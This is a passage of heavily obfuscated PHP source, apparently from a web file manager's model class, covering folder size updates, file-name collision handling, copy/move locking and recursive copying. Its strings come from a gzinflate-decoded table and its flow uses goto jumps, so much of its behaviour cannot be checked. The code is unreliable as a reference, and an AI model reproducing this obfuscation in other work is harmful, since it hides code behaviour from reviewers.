if ($œÿ˜Ï‹¯[$÷π¿“ŒÎ[440]] == $”ì¢ñ˝≈[$–∏Ç≤œö][$÷π¿“ŒÎ[440]]) { $”ì¢ñ˝≈[$–∏Ç≤œö][$÷π¿“ŒÎ[86]] += $œÿ˜Ï‹¯[$÷π¿“ŒÎ[86]]; } } foreach ($”ì¢ñ˝≈ as $œÿ˜Ï‹¯) { $Äé•Éâ‘ = $this->parentLevelArray($œÿ˜Ï‹¯[$÷π¿“ŒÎ[530]]); foreach ($Äé•Éâ‘ as $–∏Ç≤œö) { $–∏Ç≤œö = $–∏Ç≤œö . $÷π¿“ŒÎ[22]; if (!isset($”ì¢ñ˝≈[$–∏Ç≤œö])) { continue; } if ($œÿ˜Ï‹¯[$÷π¿“ŒÎ[440]] == $”ì¢ñ˝≈[$–∏Ç≤œö][$÷π¿“ŒÎ[440]]) { $”ì¢ñ˝≈[$–∏Ç≤œö][$÷π¿“ŒÎ[86]] += $œÿ˜Ï‹¯[$÷π¿“ŒÎ[86]]; } } } $ÙˆΩª¶˛ = array(); foreach ($”ì¢ñ˝≈ as $œÿ˜Ï‹¯) { if ($œÿ˜Ï‹¯[$÷π¿“ŒÎ[86]] == $œÿ˜Ï‹¯[$÷π¿“ŒÎ[2133]]) { continue; } $ÙˆΩª¶˛[] = array($÷π¿“ŒÎ[411], $œÿ˜Ï‹¯[$÷π¿“ŒÎ[411]], $÷π¿“ŒÎ[86], $œÿ˜Ï‹¯[$÷π¿“ŒÎ[86]]); } $this->saveAll($ÙˆΩª¶˛); } public function userSpaceReset($¥÷¶∫∫ê = false) { $Ù£⁄µã˚ =& $_SERVER[Á≈ ä ∞]; $Ω∫í¡î≈ = $this->where(array($Ù£⁄µã˚[420] => self::TYPE_USER, $Ù£⁄µã˚[514] => $¥÷¶∫∫ê, $Ù£⁄µã˚[419] => 0))->sum($Ù£⁄µã˚[86]); $Ω∫í¡î≈ = !$Ω∫í¡î≈ || $Ω∫í¡î≈ <= 0 ? 0 : $Ω∫í¡î≈; Model($Ù£⁄µã˚[522])->userEdit($¥÷¶∫∫ê, array($Ù£⁄µã˚[1819] => $Ω∫í¡î≈)); } public function targetSpaceUpdate($∞ıﬂÂ›„, $∏‚‚¯æ≥) { $¶ÇÜÂ¢œ =& $_SERVER[Á≈ ä ∞]; if (!$∏‚‚¯æ≥) { return; } if (!in_array($∞ıﬂÂ›„, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $∫©ùêÇ€ = $this->targetSpaceSize($∞ıﬂÂ›„, $∏‚‚¯æ≥); if ($∞ıﬂÂ›„ == self::TYPE_USER) { Model($¶ÇÜÂ¢œ[522])->userEdit($∏‚‚¯æ≥, array($¶ÇÜÂ¢œ[1819] => $∫©ùêÇ€)); } else { if ($∞ıﬂÂ›„ == self::TYPE_GROUP) { Model($¶ÇÜÂ¢œ[531])->groupEdit($∏‚‚¯æ≥, array($¶ÇÜÂ¢œ[1819] => $∫©ùêÇ€)); } } } public function targetSpaceSize($˛ËÕ∂¡›, $ôñ¨≠ˆ¬) { $õ—ôÊÀ† =& $_SERVER[Á≈ ä ∞]; $˘ë»ªÕ· = 0; $åÓÌ‘Úê = $this->sourceRoot($˛ËÕ∂¡›, $ôñ¨≠ˆ¬, !0); foreach ($åÓÌ‘Úê as $ÛÇƒ¨≥â) { if (!$ÛÇƒ¨≥â) { continue; } $˘ë»ªÕ· += floatval($ÛÇƒ¨≥â[$õ—ôÊÀ†[86]]); $Ö¯¥öﬁ≈ = array($õ—ôÊÀ†[599] => array($õ—ôÊÀ†[559], $õ—ôÊÀ†[540] . $ÛÇƒ¨≥â[$õ—ôÊÀ†[411]] . $õ—ôÊÀ†[560])); $óõ‘≠˝ø = Model($õ—ôÊÀ†[438])->field($õ—ôÊÀ†[426])->where($Ö¯¥öﬁ≈)->select(); $óõ‘≠˝ø = array_to_keyvalue($óõ‘≠˝ø, $õ—ôÊÀ†[22], $õ—ôÊÀ†[411]); $óõ‘≠˝ø = array_unique(array_filter($óõ‘≠˝ø)); if ($óõ‘≠˝ø) { $Ö¯¥öﬁ≈ = array($õ—ôÊÀ†[426] => array($õ—ôÊÀ†[427], $óõ‘≠˝ø)); $˘ë»ªÕ· += floatval($this->where($Ö¯¥öﬁ≈)->sum($õ—ôÊÀ†[86])); } } $˘ë»ªÕ· = !$˘ë»ªÕ· || $˘ë»ªÕ· <= 0 ? 0 : $˘ë»ªÕ·; return $˘ë»ªÕ·; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ŸÌ…ë≈) { return $this->fileTypeProfile($ŸÌ…ë≈, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ç∑‘˜¬Æ) { return $this->fileTypeProfile($Ç∑‘˜¬Æ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¬‡óÓ˜À, $≥⁄◊›‰•) { $Ω¥«ÄŒ„ =& $_SERVER[Á≈ ä ∞]; $·˜ß£Õ = $Ω¥«ÄŒ„[2134] . $¬‡óÓ˜À . $Ω¥«ÄŒ„[21] . $≥⁄◊›‰•; $”®ëÛÅÉ = Cache::get($·˜ß£Õ); if ($”®ëÛÅÉ) { return $”®ëÛÅÉ; } $Õ˚ï¨Ò≈ = array($Ω¥«ÄŒ„[592] => 0); if ($¬‡óÓ˜À != !1) { $Õ˚ï¨Ò≈[$Ω¥«ÄŒ„[514]] = $¬‡óÓ˜À; $Õ˚ï¨Ò≈[$Ω¥«ÄŒ„[420]] = $≥⁄◊›‰•; } $Òø”∞‰À = array(); $Òø”∞‰À[$Ω¥«ÄŒ„[2135]] = array($Ω¥«ÄŒ„[2136] => LNG($Ω¥«ÄŒ„[2135]), $Ω¥«ÄŒ„[2137] => $this->where($Õ˚ï¨Ò≈)->count(), $Ω¥«ÄŒ„[594] => $this->where($Õ˚ï¨Ò≈)->sum($Ω¥«ÄŒ„[86])); $‰ÜõòÀ∑ = KodIO::fileTypeList(); foreach ($‰ÜõòÀ∑ as $ ®Å∞⁄† => $•É‹ ©ø) { $Õ˚ï¨Ò≈[$Ω¥«ÄŒ„[421]] = $this->fileTypeWhere($ ®Å∞⁄†); $Òø”∞‰À[$ ®Å∞⁄†] = array($Ω¥«ÄŒ„[2136] => $•É‹ ©ø[$Ω¥«ÄŒ„[42]], $Ω¥«ÄŒ„[2137] => $this->where($Õ˚ï¨Ò≈)->count(), $Ω¥«ÄŒ„[594] => $this->where($Õ˚ï¨Ò≈)->sum($Ω¥«ÄŒ„[86])); } Cache::set($·˜ß£Õ, $Òø”∞‰À, 1200); return $Òø”∞‰À; } public function fileNameExist($™é°∆£∫, $ÅÜÁ¬õÂ) { $™êö¶∑ =& $_SERVER[Á≈ ä ∞]; $âÚÍ‰≠´ = $this->where(array($™êö¶∑[441] => $™é°∆£∫, $™êö¶∑[42] => $ÅÜÁ¬õÂ, $™êö¶∑[440] => 0))->find(); return is_array($âÚÍ‰≠´) ? $âÚÍ‰≠´[$™êö¶∑[411]] : !1; } public function childList($„ÑõÿÊƒ) { $•ÿ¬≥»© =& $_SERVER[Á≈ ä ∞]; $√È¶›†Ï = $•ÿ¬≥»©[2112] . $„ÑõÿÊƒ; if (isset(self::$cacheChildList[$√È¶›†Ï])) { return self::$cacheChildList[$√È¶›†Ï]; } $®‰èˆñ£ = array($•ÿ¬≥»©[441] => intval($„ÑõÿÊƒ), $•ÿ¬≥»©[440] => 0); $•‡óó¥Ä = $this->where($®‰èˆñ£)->select(); $•‡óó¥Ä = $•‡óó¥Ä ? $•‡óó¥Ä : array(); self::$cacheChildList[$√È¶›†Ï] = $•‡óó¥Ä; foreach ($•‡óó¥Ä as $ù∞ı≥€∞) { $√È¶›†Ï = $•ÿ¬≥»©[469] . $ù∞ı≥€∞[$•ÿ¬≥»©[411]]; self::$cacheSourceInfo[$√È¶›†Ï] = $ù∞ı≥€∞; } return $•‡óó¥Ä; } public function fileNameAuto($˘âŸΩÎÏ, $¡÷π±¯·, $Â‚”˘≈Ø = REPEAT_RENAME, $œó§—ﬁ¢ = false) { $óıƒ«™⁄ =& $_SERVER[Á≈ ä ∞]; $‚©ãøí… = get_path_ext($¡÷π±¯·); $í’å◊ÉÑ = $‚©ãøí… ? basename($¡÷π±¯·, $óıƒ«™⁄[20] . $‚©ãøí…) . $óıƒ«™⁄[2138] . $‚©ãøí… : $¡÷π±¯· . $óıƒ«™⁄[393]; $Ì⁄√›ΩÖ = array($óıƒ«™⁄[441] => $˘âŸΩÎÏ, $óıƒ«™⁄[440] => 0, $óıƒ«™⁄[42] => array($óıƒ«™⁄[392], $í’å◊ÉÑ)); $ﬂô¿πÇÊ = $this->field($óıƒ«™⁄[42])->where($Ì⁄√›ΩÖ)->select(); $÷†ÅˆÜæ = array_to_keyvalue($ﬂô¿πÇÊ, $óıƒ«™⁄[22], $óıƒ«™⁄[42]); return $this->fileNameAutoGet($÷†ÅˆÜæ, $¡÷π±¯·, $Â‚”˘≈Ø, $œó§—ﬁ¢); } public function fileNameAutoGet($ºÂ¯∆ÉÛ, $€∞ıòŸ§, $œÓô⁄ì¯, $≤ÃÎª·æ) { $Â√êÌ´° =& $_SERVER[Á≈ ä ∞]; if ($œÓô⁄ì¯ == REPEAT_REPLACE || !$ºÂ¯∆ÉÛ || !in_array_not_case($€∞ıòŸ§, $ºÂ¯∆ÉÛ) || $≤ÃÎª·æ && $œÓô⁄ì¯ != REPEAT_RENAME_FOLDER) { return $€∞ıòŸ§; } if ($œÓô⁄ì¯ == REPEAT_SKIP) { return !1; } $∏∂Ó°åñ = $Â√êÌ´°[20] . get_path_ext($€∞ıòŸ§); $∏∂Ó°åñ = $∏∂Ó°åñ == $Â√êÌ´°[20] || $≤ÃÎª·æ ? $Â√êÌ´°[22] : $∏∂Ó°åñ; for ($¬È¶≥û∏ = 1; $¬È¶≥û∏ <= count($ºÂ¯∆ÉÛ) + 1; $¬È¶≥û∏++) { $ ÎﬂØ∑´ = substr($€∞ıòŸ§, 0, strlen($€∞ıòŸ§) - strlen($∏∂Ó°åñ)); $àà⁄Ÿ∫ = $ ÎﬂØ∑´ . "\50{$¬È¶≥û∏}\51{$∏∂Ó°åñ}"; if (!in_array_not_case($àà⁄Ÿ∫, $ºÂ¯∆ÉÛ)) { return $àà⁄Ÿ∫; } } } } goto BﬁùÂËŒàÈ; EªäñêΩΩ∞: define($_SERVER[Á≈ ä ∞][0], $_SERVER[Á≈ ä ∞][1]); $_SERVER[ÚçüˆŸ”] = explode($_SERVER[Á≈ ä ∞][2], gzinflate(substr($_SERVER[Á≈ ä ∞][3], 10, -8))); function binCheckEq($˛ê∫◊ã£, $©ä≠ÖàÑ) { return $˛ê∫◊ã£ == $©ä≠ÖàÑ; } goto fÃ≈Ò˜ ßà; D ƒóéÖ°ä: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÈäÑé†ì) { $“ ˆÅÖÓ =& $_SERVER[Á≈ ä ∞]; if (!$this->allowLock()) { return; } $this->_lockCheck($“ ˆÅÖÓ[564], $ÈäÑé†ì); $‡èò‹å≠ = 1; $this->_lockEvent($ÈäÑé†ì, array($“ ˆÅÖÓ[565], $“ ˆÅÖÓ[566]), $‡èò‹å≠); $this->_lockParent($ÈäÑé†ì, array($“ ˆÅÖÓ[566]), $‡èò‹å≠); $this->_lockEvent($ÈäÑé†ì, array($“ ˆÅÖÓ[567], $“ ˆÅÖÓ[568]), $‡èò‹å≠); $this->_lockCheckEnd($“ ˆÅÖÓ[564], $ÈäÑé†ì); } public function lockCopyEnd($πãÉ”ÛŸ) { $ıÂéÂÒ† =& $_SERVER[Á≈ ä ∞]; if (!$this->allowLock()) { return; } $µ∆…˚Óî = 0; $this->_lockEvent($πãÉ”ÛŸ, array($ıÂéÂÒ†[565], $ıÂéÂÒ†[566]), $µ∆…˚Óî); $this->_lockParent($πãÉ”ÛŸ, array($ıÂéÂÒ†[566]), $µ∆…˚Óî); $this->_lockEvent($πãÉ”ÛŸ, array($ıÂéÂÒ†[567], $ıÂéÂÒ†[568]), $µ∆…˚Óî); } public function lockWriteStart($Û¶Óöπ–, $åÌòåÈÍ = '') { $—¶•»È∞ =& $_SERVER[Á≈ ä ∞]; if (!$this->allowLock()) { return; } $this->_lockCheck($—¶•»È∞[565], $Û¶Óöπ–); $“‘ﬁÚ€à = 1; $this->_lockKey($—¶•»È∞[569] . $Û¶Óöπ– . $—¶•»È∞[20] . $åÌòåÈÍ, $“‘ﬁÚ€à); $this->_lockEvent($Û¶Óöπ–, array($—¶•»È∞[564], $—¶•»È∞[566]), $“‘ﬁÚ€à); $this->_lockParent($Û¶Óöπ–, array($—¶•»È∞[564], $—¶•»È∞[566]), $“‘ﬁÚ€à); $this->_lockCheckEnd($—¶•»È∞[565], $Û¶Óöπ–); } public function lockWriteEnd($≥˘ŒøŸö, $ä•©à€∂ = '') { $÷¬»„à• =& $_SERVER[Á≈ ä ∞]; if (!$this->allowLock()) { return; } $≠«„Ω”ì = 0; $this->_lockKey($÷¬»„à•[569] . $≥˘ŒøŸö . $÷¬»„à•[20] . $ä•©à€∂, $≠«„Ω”ì); $this->_lockEvent($≥˘ŒøŸö, array($÷¬»„à•[564], $÷¬»„à•[566]), $≠«„Ω”ì); $this->_lockParent($≥˘ŒøŸö, array($÷¬»„à•[564], $÷¬»„à•[566]), $≠«„Ω”ì); } public function lockMoveStart($ï§˛ã˚À) { $™·Å¯Óí =& $_SERVER[Á≈ ä ∞]; if (!$this->allowLock()) { return; } $this->_lockCheck($™·Å¯Óí[566], $ï§˛ã˚À); $ü®‚∞ËÎ = 1; $this->_lockKey($™·Å¯Óí[570] . $ï§˛ã˚À, $ü®‚∞ËÎ); $this->_lockEvent($ï§˛ã˚À, array($™·Å¯Óí[564], $™·Å¯Óí[565]), $ü®‚∞ËÎ); $this->_lockParent($ï§˛ã˚À, array($™·Å¯Óí[564], $™·Å¯Óí[566]), $ü®‚∞ËÎ); $this->_lockEvent($ï§˛ã˚À, array($™·Å¯Óí[571], $™·Å¯Óí[567], $™·Å¯Óí[568]), $ü®‚∞ËÎ); $this->_lockCheckEnd($™·Å¯Óí[566], $ï§˛ã˚À); } public function lockMoveEnd($¶‡ÇŒó¢) { $÷ÅÿÃ√ =& $_SERVER[Á≈ ä ∞]; if (!$this->allowLock()) { return; } $«Ä˝Ëœª = 0; $this->_lockKey($÷ÅÿÃ√[570] . $¶‡ÇŒó¢, $«Ä˝Ëœª); $this->_lockEvent($¶‡ÇŒó¢, array($÷ÅÿÃ√[564], $÷ÅÿÃ√[565]), $«Ä˝Ëœª); $this->_lockParent($¶‡ÇŒó¢, array($÷ÅÿÃ√[564], $÷ÅÿÃ√[566]), $«Ä˝Ëœª); $this->_lockEvent($¶‡ÇŒó¢, array($÷ÅÿÃ√[571], $÷ÅÿÃ√[567], $÷ÅÿÃ√[568]), $«Ä˝Ëœª); } private function _lockCheck($…ò∂¶˝Â, $’µŸ–ªò) { $îÈûÌûá =& $_SERVER[Á≈ ä ∞]; $ô˘û‡ºÉ = $this->sourceInfo($’µŸ–ªò); $¬Ï¸˚“ß = $…ò∂¶˝Â . $îÈûÌûá[20] . $’µŸ–ªò; $this->_lockTimeStart[$¬Ï¸˚“ß] = timeFloat(); if (!is_array($ô˘û‡ºÉ)) { return; } $ë«Ë¯ﬂ˝ = LNG($îÈûÌûá[572]); CacheLock::setErrorMsg($îÈûÌûá[172] . htmlspecialchars($ô˘û‡ºÉ[$îÈûÌûá[42]]) . $îÈûÌûá[174] . $ë«Ë¯ﬂ˝); $this->_lockKey($¬Ï¸˚“ß, 1); $this->_lockKey($¬Ï¸˚“ß, 0); $—•Éÿ´⁄ = array_reverse($this->parentLevelArray($ô˘û‡ºÉ[$îÈûÌûá[530]])); foreach ($—•Éÿ´⁄ as $É¡—£ƒä) { $¬Ï¸˚“ß = $…ò∂¶˝Â . $îÈûÌûá[573] . $É¡—£ƒä; if (CacheLock::lockGet($îÈûÌûá[574] . $¬Ï¸˚“ß)) { $ô˘û‡ºÉ = $this->sourceInfo($É¡—£ƒä); CacheLock::setErrorMsg($îÈûÌûá[172] . htmlspecialchars($ô˘û‡ºÉ[$îÈûÌûá[42]]) . $îÈûÌûá[174] . $ë«Ë¯ﬂ˝); $this->_lockKey($¬Ï¸˚“ß, 1); $this->_lockKey($¬Ï¸˚“ß, 0); } } } private function _lockCheckEnd($ç™ãí»à, $º◊ÚÃœ∞) { $∏¨‘áß≥ =& $_SERVER[Á≈ ä ∞]; $÷ﬁéÛ˜ = $ç™ãí»à . $∏¨‘áß≥[20] . $º◊ÚÃœ∞; CacheLock::setErrorMsg($∏¨‘áß≥[387]); if (!isset($this->_lockTimeStart[$÷ﬁéÛ˜])) { return; } $Ô•´Áâ¶ = timeFloat() - $this->_lockTimeStart[$÷ﬁéÛ˜]; unset($this->_lockTimeStart[$÷ﬁéÛ˜]); if ($Ô•´Áâ¶ > 0.5) { unset(self::$cacheSourceInfo[$∏¨‘áß≥[469] . $º◊ÚÃœ∞]); } $ò≥À∂æ© = $this->sourceInfo($º◊ÚÃœ∞); if (!$ò≥À∂æ©) { show_json(LNG($∏¨‘áß≥[115]), !1); } } private function _lockParent($ñú©˙ã¸, $Ê´Â“∫Æ, $¥÷ÍÁ◊ë) { if (!$this->autoLockSet) { return; } $¡ÒªÜ˙Û = $this->sourceInfo($ñú©˙ã¸); if (!is_array($¡ÒªÜ˙Û)) { return; } $ˆ≥£œäí = array_reverse($this->parentLevelArray($¡ÒªÜ˙Û[$_SERVER[Á≈ ä ∞][530]])); foreach ($ˆ≥£œäí as $’——ƒ˙ÿ) { $this->_lockEvent($’——ƒ˙ÿ, $Ê´Â“∫Æ, $¥÷ÍÁ◊ë); } } private function _lockEvent($´øΩﬁºˆ, $ÒíÅ°÷‡, $ˆÁè€ã£) { $˜≥÷Îª” =& $_SERVER[Á≈ ä ∞]; if (!$this->autoLockSet) { return; } foreach ($ÒíÅ°÷‡ as $¸“úÊ≥˝) { $∫Í¶¯¸ = $¸“úÊ≥˝ . $˜≥÷Îª”[20] . $´øΩﬁºˆ; if ($ˆÁè€ã£ && CacheLock::lockGet($˜≥÷Îª”[574] . $∫Í¶¯¸)) { continue; } $this->_lockKey($∫Í¶¯¸, $ˆÁè€ã£); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($éà êò¡, $√ºïµ∞∆ = 1) { $∆ÜíÊÓΩ = $_SERVER[Á≈ ä ∞][574] . md5($éà êò¡); if ($√ºïµ∞∆) { if (isset(self::$_lockItemArr[$∆ÜíÊÓΩ])) { return; } self::$_lockItemArr[$∆ÜíÊÓΩ] = 1; CacheLock::lock($∆ÜíÊÓΩ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$∆ÜíÊÓΩ])) { return; } unset(self::$_lockItemArr[$∆ÜíÊÓΩ]); CacheLock::unlock($∆ÜíÊÓΩ); } } public function isParentOf($é¸ÿÖπ, $æ°ØÈ◊—) { $•ÅÉãßã =& $_SERVER[Á≈ ä ∞]; $ÑÈŒÂﬁ« = $this->sourceInfo($é¸ÿÖπ); $˙·˘¿î¿ = $this->sourceInfo($æ°ØÈ◊—); $›Î∏Ö˝‘ = $ÑÈŒÂﬁ«[$•ÅÉãßã[530]] . $ÑÈŒÂﬁ«[$•ÅÉãßã[411]] . $•ÅÉãßã[60]; $ÓáÈ˙Ò› = $˙·˘¿î¿[$•ÅÉãßã[530]] . $˙·˘¿î¿[$•ÅÉãßã[411]] . $•ÅÉãßã[60]; $†©§Û”é = strpos($ÓáÈ˙Ò›, $›Î∏Ö˝‘) === 0; return $†©§Û”é; } private $targetIsDelete = 0; public function copy($Âÿ…˜„», $∑¸π◊É¡, $ß´Ú⁄Âã = REPEAT_REPLACE, $◊‹—⁄ﬂ = '') { $ÙèÇä˜π =& $_SERVER[Á≈ ä ∞]; $∂á®”·¯ = $this->sourceInfo($Âÿ…˜„»); $⁄⁄Ùë˚„ = $this->sourceInfo($∑¸π◊É¡); if (!$∂á®”·¯ || !$⁄⁄Ùë˚„ || $⁄⁄Ùë˚„[$ÙèÇä˜π[419]] != $ÙèÇä˜π[98]) { return !1; } if ($this->isParentOf($Âÿ…˜„», $∑¸π◊É¡)) { return !1; } $÷á”≤Ôè = $◊‹—⁄ﬂ ? $◊‹—⁄ﬂ : $∂á®”·¯[$ÙèÇä˜π[42]]; $this->lockCopyStart($Âÿ…˜„»); $this->lockWriteStart($∑¸π◊É¡, $÷á”≤Ôè); $ëÍ˝ªº∞ = array($ÙèÇä˜π[575] => array(), $ÙèÇä˜π[576] => array(), $ÙèÇä˜π[577] => array()); $this->targetIsDelete = intval($∂á®”·¯[$ÙèÇä˜π[440]]); $≤≠⁄ôÊÆ = $this->fileNameExistCache($∑¸π◊É¡, $∂á®”·¯[$ÙèÇä˜π[42]]); $ÈØóÃéÎ = $this->_copy($Âÿ…˜„», $∑¸π◊É¡, $ß´Ú⁄Âã, $ëÍ˝ªº∞, !0, $◊‹—⁄ﬂ); $this->_childrenListClear(); $this->lockCopyEnd($Âÿ…˜„»); $this->lockWriteEnd($∑¸π◊É¡, $÷á”≤Ôè); if ($∂á®”·¯[$ÙèÇä˜π[419]] == $ÙèÇä˜π[98] && $≤≠⁄ôÊÆ == $ÈØóÃéÎ) { $this->folderSizeResetChildren($≤≠⁄ôÊÆ); } Model($ÙèÇä˜π[578])->addAll($ëÍ˝ªº∞[$ÙèÇä˜π[576]], array(), !0); if ($≤≠⁄ôÊÆ != $ÈØóÃéÎ || $∂á®”·¯[$ÙèÇä˜π[419]] == $ÙèÇä˜π[98]) { Model($ÙèÇä˜π[579])->eventCopy($ÈØóÃéÎ); } $this->saveAll($ëÍ˝ªº∞[$ÙèÇä˜π[577]]); Model($ÙèÇä˜π[209])->linkAdd($ëÍ˝ªº∞[$ÙèÇä˜π[575]]); $this->folderSizeReset($∑¸π◊É¡); $this->updateModifyTime($∑¸π◊É¡); return $ÈØóÃéÎ; } private function _copy($∆Â¶Ü“, $°∏’©˘, $ñæƒ∆”ô, &$”ïÒè˛…, $ç∂Ì˙áà, $ãù∑í‹˙ = '') { $Ÿ‡Êûíñ =& $_SERVER[Á≈ ä ∞]; $ƒüÔ¯œÌ = $this->sourceInfoCache($∆Â¶Ü“); $ƒªØ›˜ﬂ = $ƒüÔ¯œÌ[$Ÿ‡Êûíñ[419]] == $Ÿ‡Êûíñ[98]; $”Ω˜¸Ò‹ = $ãù∑í‹˙ ? $ãù∑í‹˙ : $ƒüÔ¯œÌ[$Ÿ‡Êûíñ[42]]; $§ó¥Ø©” = $this->fileNameExistCache($°∏’©˘, $”Ω˜¸Ò‹); if ($ç∂Ì˙áà) { $this->_childrenAllMake($∆Â¶Ü“); if ($ƒªØ›˜ﬂ && $§ó¥Ø©”) { $this->_childrenAllMake($§ó¥Ø©”); } } if (!$§ó¥Ø©”) { return $this->_copyCreate($∆Â¶Ü“, $°∏’©˘, $”Ω˜¸Ò‹, $”ïÒè˛…); } $ß±‚çÅ≠ = $§ó¥Ø©”; if ($ƒªØ›˜ﬂ) { if ($ñæƒ∆”ô == REPEAT_RENAME_FOLDER) { $”Ω˜¸Ò‹ = $this->fileNameAutoCache($°∏’©˘, $”Ω˜¸Ò‹, $ñæƒ∆”ô, $ƒªØ›˜ﬂ); $ß±‚çÅ≠ = $this->_copyCreate($∆Â¶Ü“, $°∏’©˘, $”Ω˜¸Ò‹, $”ïÒè˛…); } else { $®≥÷Ÿß° = $this->_childrenList($∆Â¶Ü“); foreach ($®≥÷Ÿß° as $Ãâ”ÁÜº) { $this->_copy($Ãâ”ÁÜº[$Ÿ‡Êûíñ[411]], $§ó¥Ø©”, $ñæƒ∆”ô, $”ïÒè˛…, !1); } } } else { if ($ñæƒ∆”ô == REPEAT_RENAME || $ñæƒ∆”ô == REPEAT_RENAME_FOLDER) { $”Ω˜¸Ò‹ = $this->fileNameAutoCache($°∏’©˘, $”Ω˜¸Ò‹, $ñæƒ∆”ô, $ƒªØ›˜ﬂ); $ß±‚çÅ≠ = $this->_copyCreate($∆Â¶Ü“, $°∏’©˘, $”Ω˜¸Ò‹, $”ïÒè˛…); } else { if ($ñæƒ∆”ô == REPEAT_REPLACE) { $∏‡ÍØï” = $this->sourceInfoCache($§ó¥Ø©”); $âÏΩ˛ƒ® = $this->fileHistory($∏‡ÍØï”, $ƒüÔ¯œÌ[$Ÿ‡Êûíñ[477]], $ƒüÔ¯œÌ[$Ÿ‡Êûíñ[86]]); if ($âÏΩ˛ƒ®) { $”ïÒè˛…[$Ÿ‡Êûíñ[575]][] = $ƒüÔ¯œÌ[$Ÿ‡Êûíñ[477]]; } } else { if ($ñæƒ∆”ô == REPEAT_SKIP) { } } } Hook::trigger($Ÿ‡Êûíñ[580], array($Ÿ‡Êûíñ[581], $ƒüÔ¯œÌ, 0)); } return $ß±‚çÅ≠; } private function _copyCreate($ŸŸÖ˘åâ, $®‚Ñ≤£í, $ÃÊä…·¯, &$ßìÈ„Ëú) { $ÅÁª∞èä =& $_SERVER[Á≈ ä ∞]; $π¨¡◊ä÷ = $this->sourceInfoCache($ŸŸÖ˘åâ); $à´ù∑–‹ = $this->sourceInfoCache($®‚Ñ≤£í); $Û∫≤æ—Õ = $this->_makeItemData($π¨¡◊ä÷, $à´ù∑–‹, $ÃÊä…·¯); Hook::trigger($ÅÁª∞èä[582], $Û∫≤æ—Õ); Hook::trigger($ÅÁª∞èä[583], array($ÅÁª∞èä[584], $Û∫≤æ—Õ, 0)); $êÄÅóä≤ = $this->add($Û∫≤æ—Õ); $´≈˛˜⁄ß = array($ÅÁª∞èä[411] => $êÄÅóä≤, $ÅÁª∞èä[42] => $ÃÊä…·¯); $this->_copyApplyMeta($´≈˛˜⁄ß, $ßìÈ„Ëú); if ($π¨¡◊ä÷[$ÅÁª∞èä[419]] != $ÅÁª∞èä[98]) { $ßìÈ„Ëú[$ÅÁª∞èä[575]][] = $π¨¡◊ä÷[$ÅÁª∞èä[477]]; return $êÄÅóä≤; } $∆à∏õ—û = array(); $Ìæ™ƒÒ = array(); $this->_childrenListAll($ŸŸÖ˘åâ, $∆à∏õ—û); $˙‰¨ºπ¯ = count($∆à∏õ—û); if ($˙‰¨ºπ¯ == 0) { return $êÄÅóä≤; } $«Ô™˘˝≈ = $this->sourceInfo($êÄÅóä≤); foreach ($∆à∏õ—û as $ÆÇÊ«πñ) { $‹ùøﬂÏæ = $this->_makeItemData($ÆÇÊ«πñ, $«Ô™˘˝≈, $ÆÇÊ«πñ[$ÅÁª∞èä[42]]); $‹ùøﬂÏæ[$ÅÁª∞èä[530]] = $ÆÇÊ«πñ[$ÅÁª∞èä[530]]; $Ìæ™ƒÒ[] = $‹ùøﬂÏæ; } $this->chunkEventSet($ÅÁª∞èä[585], array($ÅÁª∞èä[586], $Û∫≤æ—Õ, $˙‰¨ºπ¯)); $this->addAll($Ìæ™ƒÒ, array(), !1); $”∆Ï…Ã = $this->where(array($ÅÁª∞èä[441] => $êÄÅóä≤))->select(); $ò‰£¬∫Ù = $this->_childrenMakeRelation($∆à∏õ—û, $”∆Ï…Ã); $ò‰£¬∫Ù[$ŸŸÖ˘åâ] = $êÄÅóä≤; $˚Ÿîπò¢ = array(); $¡∑‰‘¨„ = array(); foreach ($”∆Ï…Ã as $ÆÇÊ«πñ) { $ñ°ƒàÁæ = $ÆÇÊ«πñ[$ÅÁª∞èä[411]]; $Ω·˜Ç√Å = $this->_childrenMatch($ò‰£¬∫Ù, $ÆÇÊ«πñ, $«Ô™˘˝≈); $˚Ÿîπò¢[] = array($ÅÁª∞èä[411], $ñ°ƒàÁæ, $ÅÁª∞èä[441], $Ω·˜Ç√Å[$ÅÁª∞èä[441]]); $¡∑‰‘¨„[] = array($ÅÁª∞èä[411], $ñ°ƒàÁæ, $ÅÁª∞èä[530], $Ω·˜Ç√Å[$ÅÁª∞èä[530]]); $this->_copyApplyMeta($ÆÇÊ«πñ, $ßìÈ„Ëú); if ($ÆÇÊ«πñ[$ÅÁª∞èä[419]] != $ÅÁª∞èä[98]) { $ßìÈ„Ëú[$ÅÁª∞èä[575]][] = $ÆÇÊ«πñ[$ÅÁª∞èä[477]]; } } $this->chunkEventSet($ÅÁª∞èä[587], array($ÅÁª∞èä[588], $Û∫≤æ—Õ, $˙‰¨ºπ¯)); $this->saveAll($˚Ÿîπò¢); $this->chunkEventSet($ÅÁª∞èä[589], array($ÅÁª∞èä[590], $Û∫≤æ—Õ, $˙‰¨ºπ¯)); $this->saveAll($¡∑‰‘¨„); return $êÄÅóä≤; } private function _childrenMakeRelation($ºõÛ‡ Ã, $ß§”Ìœ®) { $ï»≤¥µÌ =& $_SERVER[Á≈ ä ∞]; $¬Èªäªè = array(); $ãá„’—í = array(); foreach ($ºõÛ‡ Ã as $œ·–‡∂∫) { $¥¯äÆí· = $œ·–‡∂∫[$ï»≤¥µÌ[42]] . $ï»≤¥µÌ[18] . $œ·–‡∂∫[$ï»≤¥µÌ[530]]; $¬Èªäªè[$¥¯äÆí·] = $œ·–‡∂∫[$ï»≤¥µÌ[411]]; } foreach ($ß§”Ìœ® as $œ·–‡∂∫) { $¥¯äÆí· = $œ·–‡∂∫[$ï»≤¥µÌ[42]] . $ï»≤¥µÌ[18] . $œ·–‡∂∫[$ï»≤¥µÌ[530]]; $Êì∫Äì≤ = $¬Èªäªè[$¥¯äÆí·]; $ãá„’—í[$Êì∫Äì≤] = $œ·–‡∂∫[$ï»≤¥µÌ[411]]; } return $ãá„’—í; } private function _childrenMatch($ç†Ÿ≥Ù˛, $©Í¶Öêù, $ÑπÚˆıº) { $·Ë¯™èÎ =& $_SERVER[Á≈ ä 